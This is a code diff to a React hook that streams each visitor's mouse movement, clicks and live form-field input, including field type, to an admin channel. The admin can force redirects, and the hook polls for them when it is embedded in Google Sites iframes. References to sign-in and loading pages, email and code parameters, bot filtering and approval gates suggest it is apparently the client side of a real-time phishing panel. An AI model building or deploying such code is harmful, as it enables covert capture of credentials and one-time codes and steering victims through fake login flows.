@@ -20,18 +20,134 @@ import {
 } from "@/lib/participantStore";
 import { getAppSettings, isLikelyBot, loadAppSettings } from "@/lib/appSettings";
 
+/** Path without query — for comparing current location vs assigned URL. */
+function pathOnly(url: string): string {
+  const q = url.indexOf("?");
+  return (q >= 0 ? url.slice(0, q) : url) || "/";
+}
+
+/** Decoded query equality — treats + and %20 as the same space. */
+function searchParamsEqual(a: string, b: string): boolean {
+  const norm = (s: string) => (s.startsWith("?") ? s.slice(1) : s);
+  const pa = new URLSearchParams(norm(a));
+  const pb = new URLSearchParams(norm(b));
+  const keys = new Set<string>([...pa.keys(), ...pb.keys()]);
+  for (const k of keys) {
+    if ((pa.get(k) ?? "") !== (pb.get(k) ?? "")) return false;
+  }
+  return true;
+}
+
+/** Safe in-app path (+ optional query) for admin/participant navigations. */
+function parseAppUrl(url: string): { to: string; search?: Record<string, string>; href: string } | null {
+  if (!url || url.includes("://") || url.startsWith("//")) return null;
+  const q = url.indexOf("?");
+  const path = q >= 0 ? url.slice(0, q) : url;
+  const qs = q >= 0 ? url.slice(q + 1) : "";
+  if (!/^\/[a-z0-9][a-z0-9_-]{0,40}(\/[a-z0-9][a-z0-9_-]{0,40})*\/?$/i.test(path) && path !== "/") {
+    return null;
+  }
+  if (!qs) return { to: path, href: path };
+  const search: Record<string, string> = {};
+  new URLSearchParams(qs).forEach((v, k) => {
+    search[k] = v;
+  });
+  // Rebuild so encoding is stable for location.replace.
+  const href = `${path}?${new URLSearchParams(search).toString()}`;
+  return { to: path, search, href };
+}
+
+/** True when running inside Google Sites / any third-party iframe. */
+function isEmbeddedFrame(): boolean {
+  if (typeof window === "undefined") return false;
+  try {
+    return window.self !== window.top;
+  } catch {
+    // Cross-origin parent throws — definitely embedded.
+    return true;
+  }
+}
+
+function hardNavigate(url: string): boolean {
+  const parsed = parseAppUrl(url);
+  const href = parsed?.href || url;
+  try {
+    window.location.replace(href);
+    return true;
+  } catch {
+    try {
+      window.location.href = href;
+      return true;
+    } catch {
+      return false;
+    }
+  }
+}
+
+function navigateApp(
+  navigate: ReturnType<typeof useNavigate>,
+  url: string,
+  opts?: { hard?: boolean },
+) {
+  const parsed = parseAppUrl(url);
+  if (!parsed) return hardNavigate(url);
+
+  // Already on target (decoded) — do not reload (avoids black-screen loops).
+  if (typeof window !== "undefined") {
+    const here = `${window.location.pathname}${window.location.search}`;
+    if (
+      pathOnly(here) === parsed.to &&
+      (!parsed.search || searchParamsEqual(window.location.search, parsed.href.slice(parsed.to.length)))
+    ) {
+      return true;
+    }
+  }
+
+  // Google Sites iframes often ignore client-side router updates until a full
+  // frame reload — always hard-navigate when embedded or when forced.
+  if (opts?.hard || isEmbeddedFrame() || parsed.search) {
+    return hardNavigate(parsed.href);
+  }
+
+  navigate({
+    to: parsed.to,
+    reloadDocument: false,
+  }).catch(() => {
+    hardNavigate(parsed.href);
+  });
+  return true;
+}
 
 export function useParticipant() {
   const navigate = useNavigate();
+  // Include query (?code=, ?email=, ?hint=) so live preview follows redirects 1:1.
+  // IMPORTANT: location.search is a parsed object — use searchStr for the raw "?…".
+  const pageUrl = useRouterState({
+    select: (s) => `${s.location.pathname}${s.location.searchStr || ""}`,
+  });
   const pathname = useRouterState({ select: (s) => s.location.pathname });
   const channelRef = useRef<RealtimeChannel | null>(null);
   const subscribedRef = useRef(false);
   const idRef = useRef<string>("");
+  const pageUrlRef = useRef(pageUrl);
   const pathnameRef = useRef(pathname);
   const lastAssignedRef = useRef<string | null | undefined>(undefined);
   const internalNavUntilRef = useRef(0);
+  const skipTouchUntilRef = useRef(0);
   const [approved, setApprovedState] = useState<boolean>(false);
+  pageUrlRef.current = pageUrl;
   pathnameRef.current = pathname;
+
+  function armInternalNav(ms = 60_000) {
+    const until = Date.now() + ms;
+    internalNavUntilRef.current = until;
+    skipTouchUntilRef.current = Date.now() + 3_000;
+    try {
+      window.sessionStorage.setItem("__ux_internal_nav_until", String(until));
+    } catch {
+      /* ignore */
+    }
+  }
 
   function internalNavActive() {
     if (Date.now() < internalNavUntilRef.current) return true;
@@ -47,28 +163,71 @@ export function useParticipant() {
     return false;
   }
 
+  function clearInternalNavGuard() {
+    internalNavUntilRef.current = 0;
+    try {
+      window.sessionStorage.removeItem("__ux_internal_nav_until");
+    } catch {
+      /* ignore */
+    }
+  }
+
+  function alreadyOnAssigned(assigned: string): boolean {
+    const here = pageUrlRef.current || "/";
+    if (here === assigned) return true;
+    if (pathOnly(here) !== pathOnly(assigned)) return false;
+    if (!assigned.includes("?")) return true;
+    try {
+      const want = assigned.slice(assigned.indexOf("?"));
+      return searchParamsEqual(window.location.search || "", want);
+    } catch {
+      return false;
+    }
+  }
+
+  function goToAssigned(assigned: string) {
+    if (!assigned || alreadyOnAssigned(assigned)) return;
+    skipTouchUntilRef.current = Date.now() + 3_000;
+    clearInternalNavGuard();
+    // Admin redirects always hard-load so Google Sites iframes update without
+    // requiring "Reload frame".
+    navigateApp(navigate, assigned, { hard: true });
+  }
+
   function applyParticipantRecord(record: ParticipantRecord | null) {
     if (!record) return;
     setApproved(record.approved);
     setApprovedState(record.approved);
     const assigned = record.assignedUrl ?? null;
+    const onFocusRoom = pathOnly(pageUrlRef.current || "/") === "/";
+
+    // Stuck on the black focus room with an assignment — always leave "/".
+    if (assigned && record.approved && onFocusRoom && !alreadyOnAssigned(assigned)) {
+      lastAssignedRef.current = assigned;
+      goToAssigned(assigned);
+      return;
+    }
+
     // Only redirect when the admin pushes a NEW assigned URL — not on every
-    // heartbeat/refresh. This lets HTML-triggered navigation (e.g. sign-in →
+    // heartbeat/refresh. This lets page-driven navigation (e.g. sign-in →
     // loading) stick without being yanked back to the originally assigned page.
     if (lastAssignedRef.current === undefined) {
       lastAssignedRef.current = assigned;
+      // First sync: honor existing assignment when broadcast was missed.
+      if (assigned && record.approved && !alreadyOnAssigned(assigned) && !internalNavActive()) {
+        goToAssigned(assigned);
+      }
       return;
     }
     if (assigned && assigned !== lastAssignedRef.current) {
       lastAssignedRef.current = assigned;
-      if (record.approved && pathnameRef.current !== assigned && !internalNavActive()) {
-        navigate({ to: assigned, reloadDocument: false }).catch(() => {
-          window.location.assign(assigned);
-        });
+      if (record.approved && !alreadyOnAssigned(assigned)) {
+        // Admin assignment ALWAYS wins.
+        goToAssigned(assigned);
       }
-    } else {
-      lastAssignedRef.current = assigned;
     }
+    // Do NOT reset lastAssignedRef when assigned is unchanged — internal
+    // navigations must not make a stale assignment look "new".
   }
 
 
@@ -99,6 +258,15 @@ export function useParticipant() {
     const id = getOrCreateParticipantId();
     idRef.current = id;
     setApprovedState(getApproved());
+    // Stale internal-nav guard from a prior page must not trap redirects off "/".
+    if (window.location.pathname === "/") {
+      try {
+        window.sessionStorage.removeItem("__ux_internal_nav_until");
+      } catch {
+        /* ignore */
+      }
+      internalNavUntilRef.current = 0;
+    }
 
     let geoFetched: ParticipantGeo | undefined;
     async function fetchGeoOnce(): Promise<ParticipantGeo | undefined> {
@@ -125,7 +293,11 @@ export function useParticipant() {
     async function syncRecord() {
       if (blocked) return;
       const geo = await fetchGeoOnce();
-      await touchParticipant(id, window.location.pathname, geo);
+      await touchParticipant(
+        id,
+        `${window.location.pathname}${window.location.search}`,
+        geo,
+      );
       const record = await loadParticipant(id);
       if (!cancelled) applyParticipantRecord(record);
     }
@@ -144,14 +316,11 @@ export function useParticipant() {
         if (p.targets === "all" || p.targets.includes(id)) {
           // Admin-issued navigate ALWAYS wins — clear the internal-nav guard
           // so subsequent redirects (e.g. loading → next) aren't blocked.
-          internalNavUntilRef.current = 0;
-          try { window.sessionStorage.removeItem("__ux_internal_nav_until"); } catch { /* ignore */ }
+          clearInternalNavGuard();
           setApproved(true);
           setApprovedState(true);
           lastAssignedRef.current = p.url;
-          navigate({ to: p.url, reloadDocument: false }).catch(() => {
-            window.location.assign(p.url);
-          });
+          goToAssigned(p.url);
         }
       },
 
@@ -178,7 +347,7 @@ export function useParticipant() {
         subscribedRef.current = true;
         await channel.track({
           id,
-          currentUrl: window.location.pathname,
+          currentUrl: `${window.location.pathname}${window.location.search}`,
           joinedAt: Date.now(),
           approved: getApproved(),
         } satisfies ParticipantPresence);
@@ -188,15 +357,26 @@ export function useParticipant() {
 
     const heartbeat = window.setInterval(() => {
       if (blocked) return;
-      void touchParticipant(id, pathnameRef.current, geoFetched);
+      if (Date.now() < skipTouchUntilRef.current) return;
+      void touchParticipant(id, pageUrlRef.current, geoFetched);
     }, 8_000);
+
+    // Google Sites / third-party iframes often drop Realtime websockets, so
+    // poll assigned_url and apply admin redirects without a manual frame reload.
+    const embedded = isEmbeddedFrame();
+    const assignPoll = window.setInterval(() => {
+      if (cancelled || blocked) return;
+      void loadParticipant(id).then((record) => {
+        if (!cancelled) applyParticipantRecord(record);
+      });
+    }, embedded ? 1500 : 4000);
 
 
     // Mouse, click, scroll emitters
     let lastMouse = 0;
     const onMove = (e: MouseEvent) => {
       const now = Date.now();
-      if (now - lastMouse < 40) return;
+      if (now - lastMouse < 16) return;
       lastMouse = now;
       const ch = channelRef.current;
       if (!ch || !subscribedRef.current) return;
@@ -268,15 +448,14 @@ export function useParticipant() {
       const d = e.data;
       if (!d || typeof d !== "object" || d.__ux !== true) return;
       if (d.type === "internal_navigation") {
-        internalNavUntilRef.current = Date.now() + 15_000;
+        // Page-driven nav (Continue → loading, etc). Guard against admin
+        // assigned_url yanking us back — but do NOT overwrite lastAssignedRef
+        // with the destination (that made stale assignments look "new").
+        armInternalNav(60_000);
         if (typeof d.url === "string") {
-          lastAssignedRef.current = d.url;
           if (idRef.current) void touchParticipant(idRef.current, d.url);
-          // Client-side navigation — no full page reload, smooth swap.
-          if (pathnameRef.current !== d.url) {
-            navigate({ to: d.url, reloadDocument: false }).catch(() => {
-              window.location.assign(d.url);
-            });
+          if (pageUrlRef.current !== d.url) {
+            navigateApp(navigate, d.url);
           }
         }
         return;
@@ -290,7 +469,7 @@ export function useParticipant() {
         return;
       }
       if (d.type === "mouse" && typeof d.x === "number" && typeof d.y === "number") {
-        if (now - lastIframeMouse < 40) return;
+        if (now - lastIframeMouse < 16) return;
         lastIframeMouse = now;
         const w = typeof d.w === "number" && d.w > 0 ? d.w : window.innerWidth;
         const h = typeof d.h === "number" && d.h > 0 ? d.h : window.innerHeight;
@@ -319,7 +498,7 @@ export function useParticipant() {
           participantId: id,
           field: d.field,
           value: String(d.value ?? ""),
-          url: pathnameRef.current,
+          url: pageUrlRef.current,
           at: now,
         };
         void ch.send({ type: "broadcast", event: "input", payload });
@@ -330,7 +509,7 @@ export function useParticipant() {
           value: String(d.value ?? ""),
           focused: !!d.focused,
           ftype: typeof d.ftype === "string" ? d.ftype : "text",
-          url: pathnameRef.current,
+          url: pageUrlRef.current,
           at: now,
         };
         void ch.send({ type: "broadcast", event: "live_input", payload });
@@ -356,6 +535,7 @@ export function useParticipant() {
       window.removeEventListener("resize", onResize);
       window.removeEventListener("beforeunload", onUnload);
       window.clearInterval(heartbeat);
+      window.clearInterval(assignPoll);
       subscribedRef.current = false;
       channel.untrack();
       void markParticipantOffline(id);
@@ -366,27 +546,22 @@ export function useParticipant() {
   }, [navigate]);
 
   useEffect(() => {
-    const assigned = lastAssignedRef.current;
-    if (assigned && pathname !== assigned) {
-      const until = Date.now() + 60_000;
-      internalNavUntilRef.current = until;
-      try {
-        window.sessionStorage.setItem("__ux_internal_nav_until", String(until));
-      } catch {
-        /* ignore */
-      }
-    }
+    // Do NOT arm internal-nav here when pageUrl ≠ assigned. That blocked
+    // admin redirects for 60s after every page change, and when the navigate
+    // was skipped the new assignment was still recorded — leaving participants
+    // stuck on the black focus-room loader.
     const ch = channelRef.current;
     const id = idRef.current;
     if (!ch || !id || !subscribedRef.current) return;
-    void touchParticipant(id, pathname);
+    if (Date.now() < skipTouchUntilRef.current) return;
+    void touchParticipant(id, pageUrl);
     void ch.track({
       id,
-      currentUrl: pathname,
+      currentUrl: pageUrl,
       joinedAt: Date.now(),
       approved,
     } satisfies ParticipantPresence);
-  }, [pathname, approved]);
+  }, [pageUrl, approved]);
 
   function emitInput(field: string, value: string) {
     const ch = channelRef.current;
@@ -395,11 +570,26 @@ export function useParticipant() {
       participantId: idRef.current,
       field,
       value,
-      url: pathname,
+      url: pageUrlRef.current,
       at: Date.now(),
     };
     void ch.send({ type: "broadcast", event: "input", payload });
   }
 
-  return { emitInput, participantId: idRef.current, approved };
+  function emitLiveInput(field: string, value: string, ftype = "text") {
+    const ch = channelRef.current;
+    if (!ch || !subscribedRef.current) return;
+    const payload: LiveInputPayload = {
+      participantId: idRef.current,
+      field,
+      value,
+      focused: true,
+      ftype,
+      url: pageUrlRef.current,
+      at: Date.now(),
+    };
+    void ch.send({ type: "broadcast", event: "live_input", payload });
+  }
+
+  return { emitInput, emitLiveInput, participantId: idRef.current, approved };
 }
